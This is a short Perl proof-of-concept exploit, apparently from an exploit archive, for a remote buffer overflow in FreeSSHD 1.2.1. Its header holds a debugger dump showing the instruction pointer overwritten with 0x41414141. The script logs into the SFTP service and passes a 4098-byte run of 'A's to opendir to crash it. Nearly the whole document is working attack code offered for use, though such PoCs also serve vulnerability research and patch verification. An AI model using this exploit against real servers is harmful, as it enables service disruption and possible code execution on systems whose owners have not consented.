###############################################################################
#  FreeSSHD remote Buffer Overflow
#
# Website: http://freesshd.com/
#
# Version:1.2.1
#
# Bug: Remote Buffer Overflow ( CD)
#
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=00000001 ebx=00000000 ecx=41414141 edx=00150608 esi=00c268f0 edi=00c268f0
#eip=41414141 esp=00127c10 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
#41414141 ??              ???
#
# Poc:
 

use strict;
use Net::SSH2;
my $ip="127.0.0.1";
my $port=22;
my $user="YOUR_USER";
my $pass="YOUR_PASS";
my $ssh2 = Net::SSH2->new();
my $payload ="A" x 4098;
$ssh2->connect($ip, $port) || die "could not connect";
$ssh2->auth_password($user,$pass)|| die "wrong passwd/login";
print "Poc running ...\n";
my $sftp = $ssh2->sftp();
my $dir = $sftp->opendir($payload);
print "Buffer Overflow Successfull\n";
$ssh2->disconnect();
exit;